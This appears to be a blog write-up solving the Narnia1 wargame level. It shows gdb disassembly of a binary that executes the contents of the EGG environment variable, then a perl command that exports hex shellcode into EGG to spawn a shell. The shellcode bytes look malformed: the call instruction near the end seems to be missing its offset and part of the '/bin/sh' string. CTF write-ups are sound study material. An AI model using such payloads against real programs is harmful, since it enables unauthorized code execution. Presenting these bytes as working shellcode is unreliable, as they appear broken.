---
title: "Narnia1 Write-up"
layout: post
category: HackING
author: A1phaZer0
---
1.Get disassembled code.  
```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   [...]
   0x08048486 <+9>:	 mov    DWORD PTR [esp],0x8048570
   0x0804848d <+16>:	call   0x8048330 <getenv@plt>
   0x08048492 <+21>:	test   eax,eax
   0x08048494 <+23>:	jne    0x80484ae <main+49>
   [...]
   0x080484ba <+61>:	mov    DWORD PTR [esp],0x8048570
   0x080484c1 <+68>:	call   0x8048330 <getenv@plt>
   0x080484c6 <+73>:	mov    DWORD PTR [esp+0x1c],eax
   0x080484ca <+77>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484ce <+81>:	call   eax
   [...]
End of assembler dump.
```
<!--more-->
`<getenv@plt>` returns a pointer to the `value` part of the whole `var=value` environment string, so `call eax` will jump to where `value` starts and run.  
All one need to do is put payload into that environment variable.  
2.Put payload into `EGG`
```bash
$ export EGG=$( perl -e 'print "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"' )
```
Run ./narnia1, you'll get a shell.
